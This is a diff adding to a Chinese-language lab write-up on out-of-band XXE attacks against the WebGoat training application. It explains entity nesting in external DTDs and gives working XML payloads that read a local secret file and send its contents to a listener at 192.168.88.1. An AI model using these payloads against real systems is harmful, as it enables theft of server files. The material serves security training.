@@ -163,3 +163,44 @@ fclose($file);
 </comment>
 ```  
 查看test.txt,保存了目标内容  
+![alt text](image-13.png)  
+
+1. 在外部DTD中，send实体嵌套定义在int实体中，这是为了将后面的%secret;展开，如果不嵌套，而是直接用下面方式定义  
+```xml
+<!ENTITY % send SYSTEM 'http://192.168.88.1/get.php?a=%secret;'>
+```  
+那么test中的内容将是字符串"%file;"  
+
+2. 实体int通过外部DTD定义，这是由于xml解析器在解析内部内部实体时，对展开的内容不作二次解析，而会对外部实体展开内容再次解析如果使用下面的方式  
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE comment[
+<!ENTITY % secret SYSTEM "file:///home/webgoat/.webgoat-2023.8//XXE/webgoat/secret.txt">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.88.1/get.php?a=%secret;'>">
+%int;%send;
+]>
+<comment>
+<text>hello</text>
+</comment>
+```  
+http://192.168.88.1/get.php没有收到请求，test.txt的内容不会发生变化  
+
+3. send并不一定需要是参数，也可以是通用实体，用如下方式也可以得到目标内容  
+kk.txt  
+```xml
+<!ENTITY % int "<!ENTITY send SYSTEM 'http://192.168.88.1/get.php?a=%secret;'>">
+```  
+
+请求体  
+```xml  
+<?xml version="1.0"?>
+<!DOCTYPE comment[
+<!ENTITY % secret SYSTEM "file:///home/webgoat/.webgoat-2023.8//XXE/webgoat/secret.txt">
+<!ENTITY % out SYSTEM "http://192.168.88.1/kk.txt">
+%out;%int;
+]>
+<comment>
+<text>hello&send;</text>
+</comment>  
+```  
+
